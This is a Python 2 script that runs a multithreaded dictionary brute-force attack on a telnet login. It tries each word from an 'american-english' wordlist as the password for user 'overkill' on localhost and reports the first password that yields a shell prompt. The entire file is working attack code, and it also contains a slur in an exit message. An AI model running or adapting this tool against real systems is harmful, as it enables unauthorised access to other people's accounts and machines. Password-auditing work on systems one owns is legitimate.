#!/usr/bin/python
import telnetlib
import time
import threading
import socket

MAX_THREADS = 16
HOSTNAME = 'localhost'
USERNAME = 'overkill'
CONNECT_TIMEOUT = 10
AUTH_TIMEOUT = 3
SPAWN_PAUSE = 0.5
REST_TIME = 4

def read_until(tn, expected, timeout):
	try:
		return tn.read_until(expected, timeout).endswith(expected)
	except EOFError:
		return False

class LoginThread(threading.Thread):
	def __init__(self, password):
		threading.Thread.__init__(self)
		self.password = password
		self.done = False
		self.success = False
		self.attempts = 0

	def __str__(self):
		return '(LoginThread "' + self.password + '") '

	def run(self):
		self.done = False
		while not self.done:
			print ('%s: Attempt using "' + self.password + '" ') % self
			try:
				tn = telnetlib.Telnet(HOSTNAME)

				if not read_until(tn, "login: ", CONNECT_TIMEOUT):
					print '%s: >> Login Timeout' % self
					tn.close()
					continue
		
				tn.write(USERNAME + "\n")
		
				if not read_until(tn, "Password: ", CONNECT_TIMEOUT):
					print '%s: >> Password Timeout' % self
					tn.close()
					continue
		
				tn.write(self.password + "\n")

				self.success = read_until(tn, '$ ', AUTH_TIMEOUT)
				tn.close()
				time.sleep(REST_TIME)

				print '%s: %s' % (self, self.success and 'succeeded greatly' or 'failed horribly')

				self.done = True
			except socket.error:
				self.attempts += 1
				continue
				if self.attempts >= 3:
					self.done = True
					exit("This is retarded")
					return

def manage_threads(threads):
	result = None
	for thread in threads:
		if thread.done:
			if thread.success:
				result = thread
			threads.remove(thread)
	return result

successful_connection = None
file = open('american-english', 'r')
line = ""
i = 0
threads = []
timestamp = time.time()
while True:
	if len(threads) < MAX_THREADS:
		line = file.readline()
		i += 1

		thread = LoginThread(line.strip())
		thread.start()
		threads.append(thread)

		time.sleep(SPAWN_PAUSE)

	successful_connection = manage_threads(threads)

	# Every ten seconds print a status report on thread count.
	if time.time() > timestamp + 10:
		print "[[[ Status report: Word index (as of the report): %d. Threads active: %d ]]]" % (i, len(threads))
		timestamp = time.time()
	if not line:
		print '\nInput ran out, and nothing matched.'
		break
	if successful_connection:
		break

while len(threads):
	manage_threads(threads)

# After threads are stopped, print success...
if successful_connection:
	print '\n<< Success on "' + successful_connection.password + '"! >>\n'




